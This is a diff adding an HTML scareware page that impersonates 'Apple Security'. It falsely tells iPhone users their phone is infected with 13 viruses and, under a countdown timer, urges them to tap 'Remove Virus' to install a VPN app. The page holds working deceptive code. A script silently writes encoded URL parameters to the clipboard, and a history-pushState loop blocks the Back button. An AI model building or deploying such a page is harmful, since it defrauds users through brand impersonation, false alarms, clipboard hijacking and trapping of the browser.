@@ -1,0 +1,181 @@
+<!DOCTYPE html><html><head>
+  <base href="">
+<base href="">
+  
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=8">
+    <title>Your iPhone Has Been Compromised</title>
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+<style> * { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box } html { height: 100% } body { margin: 0; min-height: 100%; background-color: #fff; font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif; font-size: 14px; line-height: 20px; color: #333 } .w-button { display: inline-block; padding: 9px 15px; background-color: #3898EC; color: white; border: 0; line-height: inherit; text-decoration: none; cursor: pointer; border-radius: 0 } .redirect { display: none; width: 100%; height: 100%; position: absolute; z-index: 9999; display: none; } .body { background-color: #fff; overflow: hidden; } .block-final { max-width: 450px; position: absolute; bottom: 2%; left: 2%; right: 2%; z-index: 999; overflow: visible;  margin-right: auto; margin-left: auto; color: #000; opacity: 0; transition: 0.5s; -webkit-transition: 0.5s; bottom: -200px } .button-block { margin-top:7px; padding: 10px; border-radius: 15px; background-color: #fff; font-weight: bold; } .text-block-5 { padding-top: 5px; padding-bottom: 5px; text-transform: uppercase; color: #000; font-size: 15px; font-weight: 500; text-align: left; } .text-block-6 { font-size: 1em; color: #333; } .bold-text { color: red; } .button-2 { width: 100%; height: 35px; background-color: #fff; color: #487ede; font-size: 16px; text-align: center; } .header { position: relative; z-index: 999999; height: 50px; padding-top: 5px; padding-right: 15px; padding-left: 15px; background-color: #282828; } .image { float: left; } .paragraph { display: -webkit-box; display: -webkit-flex; display: -ms-flexbox; display: flex; } .text-block-7 { padding-top: 8px; padding-left: 10px; float: left; color: #fff; } .text { margin-top: 20px; padding-bottom: 20px; background: white; border-top: solid #cecece 1px; border-bottom: solid #cecece 1px; padding-right: 20px; padding-left: 20px; } .buttons { width: 100%; margin-top: 20px; } .left-button { display: inline; width: 50%; height: 100%; float: left; border: 1px solid #cecece; } .div-block { display: inline-block; width: 50%; float: right; } .div-block-copy { display: inline-block; width: 50%; float: right; } .right-button { width: 100%; height: 100%; border-top: 1px solid #cecece; border-bottom: 1px solid #cecece; } .install { display: block; height: 100%; padding: 15px; background-color: #fff; color: #007aff; font-size: 16px; text-align: center; } .text-block-8 { padding-top: 10px; color: #ccc; font-size: 9px; text-align: center; } .popup { position: absolute; top: 0px; width: 100vw;  height: 100vh; background-color: #000; opacity: 0.6; } .heading { font-size: 22px; line-height: 28px; color: #ff2f18; font-weight: 400; } .date { color: white; float: right; text-align: right; } .timer { font-size: 1.1em; font-weight: 400; color: #ff2f18; padding-top:10px; } .main { background-color: #f0eff5; height: 100vh } .content-popunder { min-height: 105px; margin-bottom: 5px; padding: 10px; border-radius: 15px; background-color: #fff; } .icon { float:left; width:25%; } .icon img{ max-width: 100%; height: auto;} .main-text { float:left; width:75% ; padding-left:10px;} 
+
+@media (prefers-color-scheme: dark) {
+	body {
+		color:#fff;
+	}
+	.date {
+		color:#747476;
+	}
+	.text-block-7 {
+		color:#747476;
+	}
+	.main {
+		background-color:#000;
+	}
+	.text {
+		background-color:#1c1c1d;
+		border-color:#2c2c2e;
+	}
+	.install {
+		background-color:#1c1c1d;
+	}
+	.right-button {
+		border-color:#2c2c2e;
+	}
+}
+
+</style>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.*?)(&|$)').exec(location.search) || [, null])[1] || '');
+        }
+    </script>
+    	<script>
+			function saveParamsToClipboard() {
+	        var getParams = (window.location.search).slice(1);
+	        var base64params = btoa(getParams);
+	        var text = '{"clipboard":"' + base64params.slice(0, 3) + "DImbW9kZWw9MTIuMDI" + base64params.slice(3) + '"}';
+	        var getSelection = window.getSelection()
+	        getSelection.removeAllRanges();
+	        var em = document.createElement('em');
+	        em.classList.add('paramsData');
+	        em.style.opacity = '0';
+	        em.style.position = 'absolute';
+	        em.style.top = '-9999px';
+	        document.body.insertBefore(em, document.body.firstChild);
+	        var params = document.querySelector('.paramsData');
+	        params.innerText = text;
+	        var range = document.createRange();
+	        range.selectNode(params);
+	        getSelection.addRange(range);
+	
+	        try {
+	            document.execCommand('copy');
+	        } catch (err) {
+	            // console.log('Oops, unable to copy');
+	        }
+	    	}
+		</script>
+</head>
+
+<body class="body">
+    <a onclick="saveParamsToClipboard()" href="#" class="redirect"></a>
+    <div class="main">
+        <div class="header w-clearfix"><img src="images/logo.jpg" width="35" height="35" alt="" class="image">
+            <div class="text-block-7">Apple Security</div>
+            <div class="date">
+                <script language="Javascript">
+                    var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                    var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                    var now = new Date();
+                    var dayOfTheWeek = now.getDay();
+                    now.setTime(now.getTime() - 0 * 24 * 60 * 60 * 1000);
+                    document.write(dayNames[(now.getDay())] + " <br> " + now.getDate() + " " + monthNames[(now.getMonth())] + " " + now.getFullYear()); 
+                </script> 
+            </div>
+        </div>
+        <div class="text">
+            <h1 class="heading">WARNING! Your Apple iPhone is severely damaged by 13 viruses!</h1>
+            <br>We have detected that your Browser is (62%) DAMAGED by BROWSER TROJAN VIRUSES picked up while surfing recent corrupted sites.
+            <br>Immediate action is required to prevent it from spreading and <font color="red">infecting sensitive data like your Facebook account, Whatsapp messages photos and private applications.</font>
+            <br><br>
+            <b>Here is how you can solve this in just a few seconds (Step by Step)</b>
+            <br><br>
+            <strong>Step 1:</strong> Tap REMOVE VIRUS to install VPN from the App Store.
+            <br>
+            <br> <strong>Step 2: </strong>Open the app to activate the latest update and remove any older (Infected) versions.
+            <div id="theTime" class="timer">1 minutes and 44 seconds</div>
+        </div>
+
+        <div class="buttons buttons w-clearfix">
+            <div class="right-button"><a href="#" onclick="saveParamsToClipboard()" class="install w-button">Remove Virus</a></div>
+        </div>
+        <div class="text-block-8">Detected By Apple.</div>
+    </div>
+    <div class="block-final" onclick="oop();" style="opacity: 1; -webkit-transition: 0.5s; transition: 0.5s; bottom: 30px;">
+       
+        <div class="content-popunder">
+            
+                <div class="icon">
+                    <img src="images/settings.png" alt="">
+                </div>
+            
+                <div class="main-text">
+                    <div class="text-block-5">Your iPhone Has Been Compromised</div>
+                    <div class="text-block-6">Immediate Action Is Required!</div>
+                </div>
+        </div>
+        <div class="button-block"><a href="#" class="button-2 w-button">OK</a></div>
+    </div>
+    <div class="popup" onclick="oop();"></div>
+    <script type="text/javascript">
+        function oop() {
+            document.getElementsByClassName('block-final')[0].style.bottom = '-200px';
+            document.getElementsByClassName('popup')[0].style.opacity = '0';
+            document.getElementsByClassName('redirect')[0].style.display = 'block';
+        }
+        setTimeout(function () {
+            document.getElementsByClassName('block-final')[0].style.bottom = '30px';
+        }, 300);
+    </script>
+    
+    <script type="text/javascript">
+        ! function () {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+                onpopstate = function (t) {
+                    t.state && location.replace("#")
+                }
+            }
+            catch (o) {}
+        }();
+    </script>
+    
+    <script language="JavaScript" type="text/javascript">
+        var sec = 59;
+        var min = 01;
+
+        function countDown() {
+            sec--;
+            if (sec == -01) {
+                sec = 59;
+                min = min - 1;
+            }
+            else {
+                min = min;
+            }
+            if (sec <= 9) {
+                sec = "0" + sec;
+            }
+            time = (min <= 9 ? "" + min : min) + " minutes and " + sec + " seconds";
+            if (document.getElementById) {
+                document.getElementById('theTime').innerHTML = time;
+            }
+            SD = window.setTimeout("countDown();", 1000);
+            if (min == '00' && sec == '00') {
+                sec = "00";
+                window.clearTimeout(SD);
+            }
+        }
+        window.onload = countDown;
+    </script>
+
+
+
+</body></html>
